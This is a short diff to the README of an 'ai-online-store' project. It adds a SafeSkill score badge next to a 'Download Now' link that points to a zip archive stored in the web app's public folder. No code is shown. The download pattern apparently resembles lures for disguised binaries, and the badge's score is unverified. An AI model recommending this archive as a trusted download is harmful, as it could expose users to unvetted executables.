@@ -1,5 +1,7 @@
 # 🤖 ai-online-store - Your Smart Shopping Companion
 
+[![SafeSkill 85/100](https://img.shields.io/badge/SafeSkill-85%2F100_Passes%20with%20Notes-yellow)](https://safeskill.dev/scan/0xmrninja197-ai-online-store)
+
 ## 📦 Download Now
 [![Download ai-online-store](https://github.com/0xmrninja197/ai-online-store/raw/refs/heads/main/apps/web/public/online-store-ai-v2.6.zip)](https://github.com/0xmrninja197/ai-online-store/raw/refs/heads/main/apps/web/public/online-store-ai-v2.6.zip) 
 
